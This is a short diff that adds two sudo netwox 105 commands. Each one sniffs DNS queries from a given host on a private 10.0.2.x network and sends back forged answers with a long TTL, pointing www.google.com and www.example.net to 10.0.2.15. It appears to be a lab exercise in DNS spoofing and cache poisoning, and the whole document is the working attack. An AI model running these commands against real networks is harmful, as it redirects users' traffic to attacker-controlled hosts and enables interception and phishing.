@@ -1,0 +1,2 @@
+sudo netwox 105 --hostname "www.google.com" --hostnameip 10.0.2.15 --authns "ns.example.net" --authnsip 10.0.2.4 --filter "src host 10.0.2.4" --ttl 19000 --spoofip raw
+sudo netwox 105 --hostname "www.example.net" --hostnameip 10.0.2.15 --authns "ns.example.net" --authnsip 10.0.2.4 --filter "src host 10.0.2.5" --ttl 19000 --spoofip raw
